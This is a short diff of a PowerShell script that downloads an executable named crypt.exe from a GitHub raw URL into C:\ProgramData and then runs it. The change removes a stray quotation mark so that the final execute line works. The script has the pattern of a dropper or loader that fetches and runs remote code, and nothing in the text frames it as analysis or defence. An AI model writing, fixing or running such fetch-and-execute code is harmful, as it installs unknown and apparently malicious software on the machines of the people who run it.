@@ -1,4 +1,4 @@
 $url = "https://github.com/ndoug2081-stack/ndoug2081-stack/raw/refs/heads/main/crypt.exe"
 $filePath = "C:\ProgramData\crypt.exe"
 Invoke-WebRequest -Uri $url -OutFile $filePath
-& $filePath"
+& $filePath
